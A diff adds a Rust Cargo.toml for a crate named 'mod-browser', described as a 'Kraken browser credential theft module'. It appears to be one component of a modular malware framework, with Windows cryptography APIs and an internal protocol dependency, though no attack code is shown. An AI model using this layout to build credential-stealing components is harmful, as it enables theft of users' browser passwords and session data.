@@ -1,0 +1,27 @@
+[package]
+name = "mod-browser"
+version = "0.1.0"
+edition = "2021"
+description = "Kraken browser credential theft module"
+
+[lib]
+crate-type = ["cdylib", "rlib"]
+
+[dependencies]
+common = { path = "../../common" }
+protocol = { path = "../../protocol", default-features = false }
+prost = "0.12"
+tracing = "0.1"
+serde_json = "1.0"
+base64 = "0.22"
+
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_Security_Cryptography",
+    "Win32_System_Memory",
+] }
+
+[features]
+default = []
+dynamic-entry = []
